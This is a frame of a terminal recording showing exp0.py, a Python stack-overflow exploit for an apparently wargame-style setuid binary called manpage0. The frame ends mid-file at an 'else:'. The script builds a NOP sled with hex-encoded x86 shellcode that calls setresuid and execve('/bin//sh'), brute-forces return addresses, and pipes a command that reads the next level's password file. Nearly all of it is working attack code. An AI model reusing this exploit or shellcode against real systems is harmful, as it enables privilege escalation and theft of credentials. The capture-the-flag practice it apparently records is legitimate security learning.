[92.137772, "o", "\u001b[1;1H\u001b[34m# exp0.py - manpage0 exploit. strcpy(buf[256], argv[1]) overflows the saved EIP at\r\r\n# offset 260 (buf 256 + saved ebp 4). buf sits at ebp-0x100 (gdb: 0xffffd9a8), but\u001b[m\u001b[2;83H\u001b[K\u001b[3;1H\u001b[34m# the address shifts with the environment, so the exploit sweeps candidate return\u001b[m\u001b[3;82H\u001b[K\u001b[4;1H\u001b[34m# addresses around 0xffffd9e8. Layout: NOP sled first, shellcode last - a landing\r\r\n# anywhere inside buf slides down the sled into the shellcode, so alignment no\r\r\n# longer matters. The shellcode (41 bytes, NUL-free) setresuid(17001,17001,17001)\r\r\n# re-asserts the saved set-user-ID manpage1 (setuid(getuid()) dropped it), then\r\r\n# execve(\"/bin//sh\"); the shell then cats the password.\u001b[m\r\r\n\u001b[35mimport\u001b[m struct, subprocess\r\r\nsc = \u001b[36mbytes\u001b[m.fromhex(\r\r\n    \u001b[31m\"31dbf7e3b369b74289d989dab0a4cd80\"\r\r\n\u001b[m    \u001b[31m\"31c050682f2f7368682f62696e89e35089e25389e1b00bcd80\"\u001b[m)\r\r\n\u001b[33mdef\u001b[m \u001b[36mtry_addr\u001b[m(addr):\r\r\n    packed = struct.pack(\u001b[31m\"<I\"\u001b[m, addr)\r\r\n    \u001b[33mif\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m \u001b[33min\u001b[m packed:\u001b[12C\u001b[34m# strcpy stops at NUL - skip these candidates\u001b[m\u001b[16;9H\u001b[33mreturn\u001b[m \u001b[36mNone\u001b[m\r\r\n    payload = \u001b[31mb\"\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m\"\u001b[m * (\u001b[31m260\u001b[m - \u001b[36mlen\u001b[m(sc)) + sc + packed\r\r\n    \u001b[33mtry\u001b[m:\u001b[19;9Hr = subprocess.run([\u001b[31m\"/manpage/manpage0\"\u001b[m, payload],\u001b[20;28H\u001b[36minput\u001b[m=\u001b[31mb\"id\u001b[m\u001b[35m\\n\u001b[m\u001b[31mcat /etc/manpage_pass/manpage1\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m,\u001b[21;28Hcapture_output=\u001b[36mTrue\u001b[m, timeout=\u001b[31m5\u001b[m)\r\r\n    \u001b[33mexcept\u001b[m subprocess.TimeoutExpired:\u001b[23;9H\u001b[33mreturn\u001b[m \u001b[36mNone\u001b[m\r\r\n    \u001b[33mif\u001b[m \u001b[31mb\"uid=17001\"\u001b[m \u001b[33min\u001b[m r.stdout:     \u001b[34m# a real hit re-assumes manpage1\u001b[m\u001b[25;9H\u001b[33mreturn\u001b[m r.stdout.decode()\r\r\n    \u001b[33mreturn\u001b[m \u001b[36mNone\u001b[m\r\r\n\u001b[33mfor\u001b[m off \u001b[33min\u001b[m \u001b[36mrange\u001b[m(\u001b[31m0\u001b[m, \u001b[31m0x800\u001b[m, \u001b[31m4\u001b[m):\r\r\n    out = try_addr(\u001b[31m0xffffd9e8\u001b[m - off)\r\r\n    \u001b[33mif\u001b[m out:\u001b[30;9H\u001b[36mprint\u001b[m(\u001b[31m\"ret=0x%x\"\u001b[m % (\u001b[31m0xffffd9e8\u001b[m - off))\u001b[31;9H\u001b[36mprint\u001b[m(out)\u001b[32;9H\u001b[33mbreak\r\r\nelse\u001b[m:\u001b[34;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
